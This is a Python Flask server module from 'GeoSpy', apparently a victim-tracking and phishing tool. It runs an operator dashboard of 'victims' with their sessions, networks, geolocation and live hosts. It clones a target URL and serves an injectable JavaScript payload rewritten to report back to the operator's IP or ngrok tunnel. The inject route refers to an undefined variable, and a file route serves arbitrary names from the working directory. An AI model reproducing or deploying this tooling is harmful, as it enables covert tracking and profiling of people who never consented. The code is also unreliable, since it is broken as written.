#!/usr/bin/env python
# -*- coding: utf-8 -*-
#**
#
#########
# GeoSpy #
#########
#
# GeoSpy depends of this file
# For full copyright information this visit: https://github.com/entynetproject/GeoSpy
#
# Copyright 2018 by Ivan Nikolsky (@entynetproject) / <entynetproject@gmail.com>
#**
from core.dependence import urllib2
import sys
import os
from flask import Flask, render_template, session, request, json, redirect, url_for, send_from_directory
from flask_cors import CORS
from geospy import GeoSpy
from core.db import Database

# Main parts, to generate relationships among others
GeoSpy = GeoSpy(1)

if getattr(sys, 'frozen', False):
    template_folder = os.path.join(sys._MEIPASS, 'templates')
    static_folder = os.path.join(sys._MEIPASS, 'static')
    app = Flask(__name__, template_folder=template_folder, static_folder=static_folder)
else:
    app = Flask(__name__, template_folder='../templates', static_folder='../static')

cors = CORS(app)

# call database
db = Database()

# preview header tool in console
GeoSpy.header()

#print db.firstTime

@app.route("/" + GeoSpy.stats_path)
def index():
    return GeoSpy.injectCSS_Paths(render_template("/login.html").replace('[LOGIN_SRC]', GeoSpy.JSFiles[2]['src']).replace('[LIBS_SRC]', GeoSpy.JSFiles[1]['src']))

@app.route("/" + GeoSpy.logout_path)
def logout():
    return GeoSpy.injectCSS_Paths(render_template("/login.html").replace('[LOGIN_SRC]', GeoSpy.JSFiles[2]['src']).replace('[LIBS_SRC]', GeoSpy.JSFiles[1]['src']))

@app.route("/login", methods=["POST"])
def login():
    id = request.form['id']
    if id == GeoSpy.stats_key:
        return json.dumps({'status':'OK', 'path' : GeoSpy.home_path, 'victim_path' : GeoSpy.victim_path, 'url_to_clone' : GeoSpy.url_to_clone, 'app_port' : GeoSpy.app_port, 'date_start' : GeoSpy.date_start, 'user_ip' : GeoSpy.localIp, 'logout': GeoSpy.logout_path, 'rm_path' : GeoSpy.remove_path})
    else:
      return json.dumps({'status':'NOPE', 'path' : '/'})

@app.route("/get_data", methods=["POST"])
def home_get_dat():
    
    db.sentences_victim('clean_usersnoping', None, 2)

    d = db.sentences_stats('get_data')
    n = db.sentences_stats('all_networks')

    rows = db.sentences_stats('get_clicks')
    c = rows[0][0]
    rows = db.sentences_stats('get_sessions')
    s = rows[0][0]
    vId = ('online', )
    rows = db.sentences_stats('get_online', vId)
    o = rows[0][0]

    injectCode = ''
    if GeoSpy.nGrokUrl != '':
        injectCode = str(GeoSpy.nGrokUrl) + '/' + str(GeoSpy.injectURL)
    else:
        injectCode = str(GeoSpy.localIp) + ':' + str(GeoSpy.app_port) + '/' + str(GeoSpy.injectURL)

    return json.dumps({'status' : 'OK', 'd' : d, 'n' : n, 'c' : c, 's' : s, 'o' : o, "ic" : injectCode})

@app.route("/get_preview", methods=["POST"])
def home_get_preview():
    vId = request.form['vId']
    t = (vId,)
    d = db.sentences_stats('get_preview', t)
    n = db.sentences_stats('id_networks', t)
    h = db.sentences_stats('get_hostsalive', t)
    return json.dumps({'status' : 'OK', 'vId' : vId, 'd' : d, 'n' : n, 'h' : h})

@app.route("/get_title", methods=["POST"])
def home_get_title():
    opener = urllib2.build_opener()
    html = opener.open(GeoSpy.url_to_clone).read()
    html = html[html.find('<title>') + 7 : html.find('</title>')]
    return json.dumps({'status' : 'OK', 'title' : html})

@app.route("/get_requests", methods=["POST"])
def home_get_requests():
    d = db.sentences_stats('get_requests')

    return json.dumps({'status' : 'OK', 'd' : d})

@app.route("/get_socialimpact", methods=["POST"])
def home_get_socialimpact():
    d = db.sentences_stats('get_socialimpact')

    return json.dumps({'status' : 'OK', 'd' : d})


@app.route("/" + GeoSpy.remove_path, methods=["POST"])
def home_rm_rows():
    vId = request.form['vId']
    db.sentences_victim('delete_victim', vId, 2)
    db.sentences_victim('delete_geo', vId, 2)
    db.sentences_victim('delete_networks', [vId], 2)
    return json.dumps({'status' : 'OK', 'id' : vId})

@app.route("/pn", methods=["POST"])
def home_putName():
    vId = request.form['vId']
    name = request.form['n']
    db.sentences_victim('update_name', [vId, name], 2)
    return json.dumps({'status' : 'OK', 'id' : vId})

@app.route("/" + GeoSpy.injectURL)
def inject():
    mPath = ''
    if getattr(sys, 'frozen', False):
        mPath = sys._MEIPASS + '/'

    f_codeToInject = open(mPath + "static/js/inject.js","r")
    codeToInject = f_codeToInject.read().replace('[LIBS_SRC]', GeoSpy.JSFiles[1]['src']).replace('[BASE_SRC]', GeoSpy.JSFiles[0]['src']).replace('[LURE_SRC]', GeoSpy.JSFiles[3]['src'])
    f_codeToInject.close()

    server_code = ''
    if GeoSpy.nGrokUrl != '':
        server_code = str(GeoSpy.nGrokUrl)
        server_code = servercode.replace("http", "https")
    else:
        server_code = str(GeoSpy.localIp) + ':' + str(GeoSpy.app_port) 
        server_code = servercode.replace("http", "https")

    codeToInject = codeToInject.replace('[HOST_ADDRESS]', server_code)
    codeToInject = codeToInject.replace('[YOUR_GMAPS_API_KEY]', GeoSpy.gmaps)
    return codeToInject

@app.route("/static/js/<JSFile>")
def busted(JSFile):
    code = ''
    mPath = ''
    if getattr(sys, 'frozen', False):
        mPath = sys._MEIPASS + '/'
    for obj in GeoSpy.JSFiles:
        if str(obj['src']) == str(JSFile):
            s_code = open(mPath + "static/js/" + obj['path'],"r") 
            code = s_code.read()
            s_code.close()
            break
    if code != '':
        return code
    else:
        return render_template('404.html') 

@app.route("/styles/<CSSFile>")
def style_redirect(CSSFile):
    code = ''
    for obj in GeoSpy.CSSFiles:
        if str(obj['src']) == str(CSSFile):
            code = obj['path']
            break
    return redirect(code)

@app.route("/static/files/<File>")
def file_redirect(File):
    uploads = os.path.join(os.getcwd(), './')
    return send_from_directory(directory=uploads, filename=File)
